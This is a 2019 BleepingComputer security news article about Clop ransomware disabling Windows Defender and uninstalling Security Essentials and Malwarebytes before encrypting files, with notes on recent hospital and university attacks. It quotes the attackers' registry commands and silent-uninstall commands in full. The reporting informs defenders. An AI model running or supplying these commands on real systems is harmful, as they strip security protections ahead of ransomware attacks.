<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8"/>
    <meta property="og:url" content="https://www.bleepingcomputer.com/news/security/clop-ransomware-tries-to-disable-windows-defender-malwarebytes/"/>
    <meta property="og:site_name" content="BleepingComputer"/>
    <meta property="article:published_time" content="2019-11-22T18:50:09+00:00"/>
    <meta property="og:title" content="Clop Ransomware Tries to Disable Windows Defender, Malwarebytes"/>
    <meta property="og:description" content="In order to successfully encrypt a victim's data, the Clop CryptoMix Ransomware is now attempting to disable Windows Defender as well as remove the Microsoft Security Essentials and Malwarebytes' standalone Anti-Ransomware programs."/>
  </head>
  <body>
    <article>
      <h1>Clop Ransomware Tries to Disable Windows Defender, Malwarebytes</h1>
      <address><time datetime="2019-11-22T18:50:09+00:00">22 Nov 2019, 18:50</time> by <a rel="author" href="https://www.bleepingcomputer.com/author/lawrence-abrams/" target="_blank">Lawrence Abrams</a></address>
      <figure>
        <img src="https://www.bleepstatic.com/content/hl-images/2018/07/10/ransomware-header.jpg"/>
      </figure>
      <p>In order to successfully encrypt a victim's data, the Clop CryptoMix Ransomware is now attempting to disable Windows Defender as well as remove the Microsoft Security Essentials and Malwarebytes' standalone Anti-Ransomware programs.</p>
      <p>Clop is a variant of the CryptoMix Ransomware, that uses the Clop extension and signs its CIopReadMe.txt ransom note with "Dont Worry C|0P".  Due to this, the ransomware has become known as Clop Ransomware, which is how we will refer to it in this article.</p>
      <figure>
        <img src="https://www.bleepstatic.com/images/news/ransomware/c/cryptomix/clop/clop-ransom-note.jpg"/>
      </figure>
      <h3>Attempting to disable Windows Defender</h3>
      <p>According to analysis performed by security researcher and reverse engineer <a href="https://twitter.com/VK_Intel/status/1197433423956258816?s=20">Vitali Kremez</a>, a small program is being running by the Clop actors before encryption that will attempt to disable a variety of security software, including Windows Defender.</p>
      <p>This is done to prevent behavioral algorithms from detecting the file encryption and block the ransomware.</p>
      <p>To disable Windows Defender, it <a href="https://github.com/k-vitali/Malware-Misc-RE/blob/master/2019-11-21-clop-ransomware-anti-ms-commands.vk.raw">configures various Registry values</a> that disable behavior monitoring, real time protection, sample uploading to Microsoft, Tamper Protection, cloud detections, and antispyware detections.</p>
      <pre>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f <br/>cmd.exe /C reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpCloudBlockLevel" /t REG_DWORD /d "0" /f <br/>cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d "0" /f</pre>
      <p>The good news is if you have <a href="https://www.bleepingcomputer.com/tutorials/how-to-enable-windows-10-tamper-protection-security-feature/">Tamper Protection enabled</a> in Windows 10, these settings will simply be reset back to their default configuration and Windows Defender will not be disabled.</p>
      <p>For those, who do not use Tamper Protection, though, this will effectively disable Windows Defender so that it does not detect the ransomware's actions.</p>
      <p>In addition to Windows Defender, Clop is also targeting older computers by uninstalling Microsoft Security Essentials. As CryptoMix is run with administrator privileges by the attackers, this command will remove the software without a problem.</p>
      <pre>cmd.exe /C "C:\Program Files\Microsoft Security Client\Setup.exe" /x /s</pre>
      <h3>Tries to uninstall Malwarebytes Anti-Ransomware </h3>
      <p>In addition to Windows Defender, security researcher <a href="https://twitter.com/malwrhunterteam/status/1195288774957244416">MalwareHunterteam discovered</a> that this same utility is also targeting the standalone Malwarebytes Anti-Ransomware program.</p>
      <p>When the program is execute it will attempt to remove Malwarebytes' Anti-Ransomware product using the following command:</p>
      <pre>C:\Program Files\MalwareBytes\Anti-Ransomware\unins000.exe /verysilent /suppressmsgboxes /norestart</pre>
      <p>I found the above attempt a bit odd as Malwarebytes Anti-Ransomware product was retired and instead bundled into their flagship Malwarebytes Antimalware software.</p>
      <p>At the same time, as CryptoMix is typically installed through Remote Desktop or other network infiltration, by targeting products that older enterprise workstations may be using, allows the ransomware to run uninhibited when encrypting an entire network.</p>
      <h3>Clop used in recent network-wide attacks</h3>
      <p>While CryptoMix is an older ransomware, it was historically used by affiliates who gained access to a computer or network via Remote Desktop.</p>
      <p>More recently, an APT group named TA505 has been using it as a final payload after compromising a network in similar attacks as Ryuk, BitPaymer, and DoppelPaymer.</p>
      <figure>
        <img src="https://www.bleepstatic.com/images/news/ransomware/c/cryptomix/clop/apt/vitali-tweet.jpg"/>
      </figure>
      <p>Just this week, <a href="https://actu.fr/normandie/rouen_76540/une-rancon-apres-cyberattaque-chu-rouen-ce-reclament-pirates_29475649.html">French media</a> started reporting that the Hospital Center University De Rouen was targeted with the Clop ransomware, which impacted some of their services.</p>
      <p>"According to an internal source contacted by 76actu , many files (Excel, Word, .doc ...) are well and truly locked by hackers. These are encrypted under the suffix .clop, and spontaneously generate a text message that we could consult."</p>
      <p>Last month, the University of Antwerp in Belgium <a href="https://tweakers.net/nieuws/159138/universiteit-antwerpen-is-getroffen-door-clop-ransomware.html">was also hit</a> with Clop, which impacted their payment systems, video lecture archives, and mailing system.</p>
      <p><b>Update 11/22/19: </b>Updated to include information about recent attacks</p>
    </article>
  </body>
</html>